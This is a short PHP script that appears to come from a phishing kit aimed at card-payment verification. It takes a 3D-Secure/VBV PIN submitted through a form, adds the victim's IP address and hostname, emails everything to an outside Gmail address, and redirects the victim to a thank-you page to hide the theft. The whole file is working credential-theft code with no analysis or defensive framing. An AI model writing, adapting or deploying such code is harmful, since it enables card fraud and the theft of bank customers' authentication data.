<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Oui c sa VBV HIHI +++====\n";
$message .= "3D-SECURE: ".$_POST['pin']."\n";
$message .= "======+ BY +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "nabilwind5974@gmail.com"; 
$subject = "3D VBV CA *_* [".$_POST['pin']."] $ip";
$headers = "From:  <Resultat@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: thankyou.php");

?>